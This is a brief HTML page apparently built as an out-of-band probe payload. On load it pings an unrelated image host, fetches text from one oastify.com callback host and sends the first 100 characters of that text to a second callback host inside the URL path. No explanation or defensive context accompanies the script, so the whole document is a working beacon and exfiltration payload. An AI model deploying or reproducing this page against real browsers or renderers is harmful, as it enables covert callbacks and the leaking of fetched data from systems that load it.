<!DOCTYPE html>
<html>
  <head>
    <title>Fetch and Send Example</title>
    <meta charset="UTF-8">
  </head>
  <body>
    <img src='http://gofodole.com'>
    <script>
      const fetchUrl = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/1hello';
      const sendUrl = 'https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com/coco';
      const options = {
        mode: 'no-cors'
      };
      fetch(fetchUrl, options)
        .then(response => response.text())
        .then(body => {
          const croppedBody = body.slice(0, 100);
          const requestUrl = `${sendUrl}/${croppedBody}`;
          fetch(requestUrl, options)
            .then(response => response.text())
            .then(result => console.log(result))
            .catch(error => console.error(error));
        })
        .catch(error => console.error(error));
    </script>
  </body>
</html>
